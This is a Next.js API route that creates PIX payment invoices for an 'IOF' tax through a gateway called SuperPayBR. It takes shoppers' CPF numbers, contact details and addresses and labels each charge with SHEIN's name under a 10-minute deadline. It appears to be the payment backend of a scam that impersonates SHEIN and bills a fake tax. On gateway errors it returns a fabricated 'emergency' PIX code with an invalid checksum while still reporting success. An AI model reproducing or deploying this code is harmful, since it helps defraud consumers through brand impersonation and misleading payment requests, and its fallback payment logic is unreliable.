import { type NextRequest, NextResponse } from "next/server"

export async function POST(request: NextRequest) {
  try {
    console.log("=== CRIANDO FATURA IOF SUPERPAYBR ===")

    const body = await request.json()
    const { amount, type } = body

    // Obter dados dos headers
    const cpfData = JSON.parse(request.headers.get("x-cpf-data") || "{}")
    const userEmail = request.headers.get("x-user-email") || ""
    const userWhatsApp = request.headers.get("x-user-whatsapp") || ""
    const deliveryAddress = JSON.parse(request.headers.get("x-delivery-address") || "{}")

    console.log("📋 Dados da fatura IOF:", {
      amount,
      type,
      cliente: cpfData.nome,
      email: userEmail,
    })

    // Primeiro, fazer autenticação
    const authResponse = await fetch(`${request.nextUrl.origin}/api/superpaybr/auth`, {
      method: "POST",
    })
    const authResult = await authResponse.json()

    if (!authResult.success) {
      throw new Error("Falha na autenticação SuperPayBR")
    }

    const accessToken = authResult.data.access_token

    // Gerar external_id único para IOF
    const externalId = `SHEIN_IOF_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`

    // Preparar dados da fatura IOF SuperPayBR
    const invoiceData = {
      external_id: externalId,
      customer: {
        name: cpfData.nome || "Cliente SHEIN",
        email: userEmail || "cliente@shein.com",
        phone: userWhatsApp?.replace(/\D/g, "") || "11999999999",
        document: cpfData.cpf?.replace(/\D/g, "") || "00000000000",
        address: {
          street: deliveryAddress.street || "Rua Principal",
          number: deliveryAddress.number || "123",
          district: deliveryAddress.neighborhood || "Centro",
          city: deliveryAddress.city || "São Paulo",
          state: deliveryAddress.state || "SP",
          zipcode: deliveryAddress.zipcode?.replace(/\D/g, "") || "01000000",
          country: "BR",
        },
      },
      products: [
        {
          name: "IOF - Imposto sobre Operações Financeiras",
          quantity: 1,
          price: Math.round(amount * 100), // SuperPayBR usa centavos
        },
      ],
      payment_methods: ["pix"],
      webhook_url: `${request.nextUrl.origin}/api/superpaybr/webhook`,
      expires_at: new Date(Date.now() + 10 * 60 * 1000).toISOString(), // 10 minutos
    }

    console.log("🚀 Enviando fatura IOF para SuperPayBR...")

    const createResponse = await fetch("https://api.superpaybr.com/invoices", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${accessToken}`,
        Accept: "application/json",
      },
      body: JSON.stringify(invoiceData),
    })

    console.log("📥 Resposta SuperPayBR IOF:", {
      status: createResponse.status,
      statusText: createResponse.statusText,
      ok: createResponse.ok,
    })

    if (createResponse.ok) {
      const invoiceResult = await createResponse.json()
      console.log("✅ Fatura IOF SuperPayBR criada com sucesso!")

      // Extrair dados do PIX da resposta
      const pixPayload = invoiceResult.payment?.details?.pix_code || ""
      const qrCodeUrl = invoiceResult.payment?.details?.qrcode || ""

      // Gerar QR Code usando QuickChart como fallback
      const finalQrCode =
        qrCodeUrl ||
        (pixPayload
          ? `https://quickchart.io/qr?text=${encodeURIComponent(pixPayload)}&size=200`
          : "/placeholder.svg?height=200&width=200")

      // Mapear resposta para formato esperado
      const mappedInvoice = {
        id: invoiceResult.id,
        invoice_id: invoiceResult.id,
        external_id: externalId,
        pix: {
          payload: pixPayload,
          image: finalQrCode,
          qr_code: finalQrCode,
        },
        status: {
          code: invoiceResult.status?.code || 1,
          title: invoiceResult.status?.title || "Aguardando Pagamento",
          text: "pending",
        },
        valores: {
          bruto: invoiceResult.prices?.total || Math.round(amount * 100),
          liquido: invoiceResult.prices?.total || Math.round(amount * 100),
        },
        vencimento: {
          dia: invoiceResult.payment?.due || new Date(Date.now() + 10 * 60 * 1000).toISOString().split("T")[0],
        },
        type: "real",
      }

      console.log("🎯 QR Code IOF URL gerada:", finalQrCode)

      return NextResponse.json({
        success: true,
        data: mappedInvoice,
        raw_response: invoiceResult,
      })
    } else {
      const errorText = await createResponse.text()
      console.log("❌ Erro ao criar fatura IOF SuperPayBR:", createResponse.status, errorText)

      // Retornar fatura de emergência IOF
      const emergencyPix = `00020101021226580014br.gov.bcb.pix2536emergency.superpaybr.com/qr/v2/IOF${Date.now()}520400005303986540${amount.toFixed(2)}5802BR5909SHEIN IOF5011SAO PAULO62070503***6304IOFG`

      const emergencyInvoice = {
        id: externalId,
        invoice_id: externalId,
        external_id: externalId,
        pix: {
          payload: emergencyPix,
          image: `https://quickchart.io/qr?text=${encodeURIComponent(emergencyPix)}&size=200`,
          qr_code: `https://quickchart.io/qr?text=${encodeURIComponent(emergencyPix)}&size=200`,
        },
        status: {
          code: 1,
          title: "Aguardando Pagamento",
          text: "pending",
        },
        valores: {
          bruto: Math.round(amount * 100),
          liquido: Math.round(amount * 100),
        },
        vencimento: {
          dia: new Date(Date.now() + 10 * 60 * 1000).toISOString().split("T")[0],
        },
        type: "emergency",
      }

      return NextResponse.json({
        success: true,
        data: emergencyInvoice,
        fallback: true,
        message: "Fatura IOF criada em modo de emergência",
      })
    }
  } catch (error) {
    console.log("❌ Erro ao criar fatura IOF SuperPayBR:", error)

    // Retornar fatura de emergência em caso de erro
    const { amount } = await request.json()
    const externalId = `SHEIN_IOF_EMG_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
    const emergencyPix = `00020101021226580014br.gov.bcb.pix2536emergency.superpaybr.com/qr/v2/IOF${Date.now()}520400005303986540${amount.toFixed(2)}5802BR5909SHEIN IOF5011SAO PAULO62070503***6304IOFG`

    const emergencyInvoice = {
      id: externalId,
      invoice_id: externalId,
      external_id: externalId,
      pix: {
        payload: emergencyPix,
        image: `https://quickchart.io/qr?text=${encodeURIComponent(emergencyPix)}&size=200`,
        qr_code: `https://quickchart.io/qr?text=${encodeURIComponent(emergencyPix)}&size=200`,
      },
      status: {
        code: 1,
        title: "Aguardando Pagamento",
        text: "pending",
      },
      valores: {
        bruto: Math.round(amount * 100),
        liquido: Math.round(amount * 100),
      },
      vencimento: {
        dia: new Date(Date.now() + 10 * 60 * 1000).toISOString().split("T")[0],
      },
      type: "emergency",
    }

    return NextResponse.json({
      success: true,
      data: emergencyInvoice,
      fallback: true,
      message: "Fatura IOF criada em modo de emergência",
    })
  }
}
